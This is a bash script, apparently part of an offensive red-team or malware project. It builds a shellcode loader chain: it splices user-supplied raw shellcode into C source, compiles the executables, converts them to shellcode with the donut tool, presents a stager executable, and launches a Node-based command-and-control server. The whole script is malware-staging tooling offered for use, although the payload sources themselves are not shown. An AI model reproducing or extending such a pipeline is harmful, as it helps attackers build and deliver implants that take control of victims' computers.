#!/bin/bash

# Author:       Noah Ostle
# Description:  A bash script that will auomatically make the executables, 
#               convert them to shellcode using donut, start the node C2
#               server, and present you with the stager executable.

mkdir shellcode/loaders
mkdir shellcode/executables

cleanup() {
echo -e "\n[+] Cleaning up...\n"
make -s -C src clean
rm loader.bin 2> /dev/null
rm shellcode/loaders/* -f 2> /dev/null
}
trap cleanup SIGINT




echo -e "[/] Checking Dependencies..."
if pip3 show donut-shellcode | grep -q "not found"; then
    pip3 install -r shellcode/requirements.txt
fi
if [ ! -d C2server/node_modules ]; then
    cd C2server && npm install && cd ..
fi
echo -e "[+] Done!\n"

echo -e '[+] Note: shellcode file must be in format;\n    unsigned char buf[] = "\\x90\\x90 ... ";\n'
echo "[?] Enter the path to your shellcode : "
read fp
cat src/s2Head $fp src/s2Tail > src/s2.c
echo -e "[+] Executables generated!\n"


echo -e "[/] Compiling executables..."
make -s -C src all
echo -e "[+] Done!\n"

echo -e "[/] Generating shellcode..."
python3 shellcode/exetoshellcode.py
echo -e "[+] Done!\n"

echo -e "[!] All payloads staged.\n"
echo -e "[+] Stager can be found at $(pwd)/s1.exe\n"

echo -e "[/] Starting C2 Server...\n"
node C2server/server.js


